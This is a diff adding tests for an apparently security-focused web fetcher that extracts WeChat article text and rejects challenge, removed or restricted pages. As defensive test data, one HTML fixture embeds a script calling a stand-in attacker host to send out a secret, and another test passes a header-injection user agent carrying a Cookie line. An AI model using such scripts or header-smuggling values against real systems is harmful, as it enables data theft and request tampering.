@@ -22,6 +22,7 @@ import {
   ToolRegistry,
   createToolPermissionGrant,
   extractUntrustedWebText,
+  type SecureWebRequest,
   type ToolDefinition,
 } from "../src/index.js";
 
@@ -98,6 +99,59 @@ describe("authorized file boundary", () => {
 });
 
 describe("web and untrusted-content boundary", () => {
+  it("uses one trusted host-provided browser user agent without adding credentials", async () => {
+    const require = createRequire(import.meta.url);
+    const httpsModule = require("node:https") as typeof import("node:https");
+    const originalRequest = httpsModule.request;
+    const browserUserAgent = "Mozilla/5.0 Chrome/142.0.0.0 Electron/44.0.0 Safari/537.36";
+    let requestCount = 0;
+    httpsModule.request = ((url: URL, options: any, done: (response: any) => void) => {
+      requestCount += 1;
+      assert.equal(url.hostname, "mp.weixin.qq.com");
+      assert.equal(options.headers["user-agent"], browserUserAgent);
+      assert.equal(options.headers.cookie, undefined);
+      assert.equal(options.headers.authorization, undefined);
+      options.lookup(url.hostname, {}, (_error: unknown, address: string) => {
+        assert.equal(address, "101.226.103.106");
+      });
+      const request = new EventEmitter() as any;
+      request.destroy = () => request;
+      request.end = () => queueMicrotask(() => {
+        const response = new EventEmitter() as any;
+        response.statusCode = 200;
+        response.headers = { "content-type": "text/html" };
+        done(response);
+        response.emit("data", Buffer.from("<h1 id='activity-name'>标题</h1><div id='js_content'><p>正文。</p></div>"));
+        response.emit("end");
+      });
+      return request;
+    }) as typeof httpsModule.request;
+    syncBuiltinESMExports();
+
+    try {
+      const fetcher = new SecureWebFetcher({
+        policy: new NetworkAccessPolicy({ resolveHost: async () => ["101.226.103.106"] }),
+        userAgent: browserUserAgent,
+      });
+      const result = await fetcher.fetchText("https://mp.weixin.qq.com/s/example");
+      assert.equal(result.content.title, "标题");
+      assert.equal(requestCount, 1);
+    } finally {
+      httpsModule.request = originalRequest;
+      syncBuiltinESMExports();
+    }
+  });
+
+  it("rejects a host-provided user agent containing header control characters", () => {
+    assert.throws(
+      () => new SecureWebFetcher({
+        policy: new NetworkAccessPolicy({ resolveHost: async () => ["93.184.216.34"] }),
+        userAgent: "Mozilla/5.0\r\nCookie: secret",
+      }),
+      TypeError,
+    );
+  });
+
   it('HTTP opt-in uses a pinned HTTP request, preserves public redirects and rejects unsafe targets', async () => {
     const require = createRequire(import.meta.url);
     const httpModule = require('node:http') as typeof import('node:http');
@@ -360,6 +414,141 @@ describe("web and untrusted-content boundary", () => {
         error instanceof Error &&
         error.name === "SecureWebFetchError" &&
         !String(error).includes("secret"),
+    );
+  });
+});
+
+describe("WeChat article extraction", () => {
+  const wechatPolicy = (): NetworkAccessPolicy => new NetworkAccessPolicy({
+    resolveHost: async () => ["101.226.103.106"],
+  });
+
+  it("extracts only the inert article body with title, author and paragraph breaks", async () => {
+    const html = `
+      <html>
+        <head><title>menu title that should not win</title></head>
+        <body>
+          <nav>首页 文章列表 登录</nav>
+          <h1 id="activity-name">  安全读取微信文章  </h1>
+          <a id="js_name">  示例作者  </a>
+          <div id="js_content">
+            <p>第一段。</p>
+            <p>第二段有 <strong>重点</strong>。<br>同段换行。</p>
+            <script>fetch("https://attacker.invalid/secret")</script>
+            <aside>推荐菜单</aside>
+          </div>
+          <footer>点赞 在看 分享</footer>
+        </body>
+      </html>
+    `;
+    const fetcher = new SecureWebFetcher({
+      policy: wechatPolicy(),
+      request: async () => ({
+        status: 200,
+        headers: { "content-type": "text/html; charset=utf-8" },
+        body: Buffer.from(html, "utf8"),
+      }),
+    });
+
+    const result = await fetcher.fetchText("https://mp.weixin.qq.com/s/example");
+
+    assert.equal(result.content.text, "安全读取微信文章\n\n第一段。\n\n第二段有 重点。\n同段换行。");
+    assert.equal(result.content.title, "安全读取微信文章");
+    assert.equal(result.content.author, "示例作者");
+    assert.equal(result.content.contentSelector, "#js_content");
+    assert.equal(result.content.activeContentRemoved, true);
+    assert.equal(result.content.truncated, false);
+    assert.equal(result.content.totalChars, 30);
+    assert.equal(JSON.stringify(result).includes("首页"), false);
+    assert.equal(JSON.stringify(result).includes("推荐菜单"), false);
+    assert.equal(JSON.stringify(result).includes("attacker.invalid"), false);
+  });
+
+  it("rejects a WeChat verification redirect instead of importing the challenge page", async () => {
+    const request: SecureWebRequest = async (target) => {
+      if (target.url.includes("/s/example")) {
+        return {
+          status: 302,
+          headers: { location: "/mp/wappoc_appmsgcaptcha?poc_token=opaque" },
+          body: new Uint8Array(),
+        };
+      }
+      return {
+        status: 200,
+        headers: { "content-type": "text/html" },
+        body: Buffer.from("<html><body>环境异常，完成验证后即可继续访问。</body></html>"),
+      };
+    };
+    const fetcher = new SecureWebFetcher({ policy: wechatPolicy(), request });
+
+    await assert.rejects(
+      () => fetcher.fetchText("https://mp.weixin.qq.com/s/example"),
+      { name: "SecureWebFetchError", code: "WEB_ARTICLE_ACCESS_RESTRICTED" },
+    );
+  });
+
+  it("does not mistake valid article prose mentioning verification for a challenge page", async () => {
+    const fetcher = new SecureWebFetcher({
+      policy: wechatPolicy(),
+      request: async () => ({
+        status: 200,
+        headers: { "content-type": "text/html" },
+        body: Buffer.from(`
+          <h1 id="activity-name">安全实践</h1>
+          <div id="js_content">
+            <p>遇到环境异常时，应进行安全验证后再继续访问业务系统。</p>
+            <p>这是文章正文，不是验证页。</p>
+          </div>
+        `),
+      }),
+    });
+
+    const result = await fetcher.fetchText("https://mp.weixin.qq.com/s/security-article");
+    assert.equal(result.content.title, "安全实践");
+    assert.match(result.content.text, /这是文章正文/u);
+  });
+
+  it("distinguishes removed and missing WeChat article bodies", async () => {
+    const removed = new SecureWebFetcher({
+      policy: wechatPolicy(),
+      request: async () => ({
+        status: 200,
+        headers: { "content-type": "text/html" },
+        body: Buffer.from("<html><body><div class='weui-msg__desc'>该内容已被发布者删除</div></body></html>"),
+      }),
+    });
+    await assert.rejects(
+      () => removed.fetchText("https://mp.weixin.qq.com/s/removed"),
+      { name: "SecureWebFetchError", code: "WEB_ARTICLE_UNAVAILABLE" },
+    );
+
+    const missing = new SecureWebFetcher({
+      policy: wechatPolicy(),
+      request: async () => ({
+        status: 200,
+        headers: { "content-type": "text/html" },
+        body: Buffer.from("<html><body><h1 id='activity-name'>只有标题</h1><div id='js_content'>  </div></body></html>"),
+      }),
+    });
+    await assert.rejects(
+      () => missing.fetchText("https://mp.weixin.qq.com/s/missing"),
+      { name: "SecureWebFetchError", code: "WEB_ARTICLE_CONTENT_MISSING" },
+    );
+  });
+
+  it("rejects a WeChat access restriction page without treating its controls as article text", async () => {
+    const fetcher = new SecureWebFetcher({
+      policy: wechatPolicy(),
+      request: async () => ({
+        status: 200,
+        headers: { "content-type": "text/html" },
+        body: Buffer.from("<html><body><p>请在微信客户端打开链接</p><button>确定</button></body></html>"),
+      }),
+    });
+
+    await assert.rejects(
+      () => fetcher.fetchText("https://mp.weixin.qq.com/s/restricted"),
+      { name: "SecureWebFetchError", code: "WEB_ARTICLE_ACCESS_RESTRICTED" },
     );
   });
 });
